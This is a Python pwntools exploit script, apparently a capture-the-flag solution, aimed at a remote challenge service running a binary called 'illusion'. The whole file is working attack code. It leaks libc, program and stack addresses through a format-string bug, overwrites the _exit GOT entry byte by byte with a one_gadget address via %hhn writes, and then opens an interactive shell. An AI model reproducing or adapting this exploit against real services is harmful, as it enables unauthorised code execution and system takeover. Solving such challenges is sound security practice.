#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

r = remote('eofqual.zoolab.org', 10104)
#r = process('./illusion_patch')
elf = ELF('./illusion')
libc = ELF('./libc.so.6')

r.sendlineafter('\n', '%11$lx%15$lx%13$lx')
r.recvuntil('\n')
libc.address = int(r.recvn(6*2), 16) - 0x270b3
text_base = int(r.recvn(6*2), 16) - 0x1211
stack_ret = int(r.recvn(6*2), 16) - 0x120
exit = text_base + elf.got['_exit']
magic = libc.address + 0xe6e76

fmt = bytes(f'%18c%8$hhn'.ljust(0x10,'A'), 'ascii')
r.sendlineafter('\n', fmt + p64(stack_ret)[:-1])
stack_ret -= 0x20


for i in range(6):
    fmt = bytes(f'%{magic&0xff}c%8$hhn'.ljust(0x10,'A'), 'ascii')
    r.sendlineafter('?\n', fmt + p64(exit+i)[:-1])
    magic >>= 8

    fmt = bytes(f'%{0x12}c%8$hhn'.ljust(0x10,'A'), 'ascii')
    r.sendlineafter('?\n', fmt + p64(stack_ret)[:-1])
    stack_ret -= 0x20

# clear *r10
r.sendlineafter('?\n', '\0'*8+'a')
r.sendlineafter('?\n', '\0'*8+'a')

r.interactive()
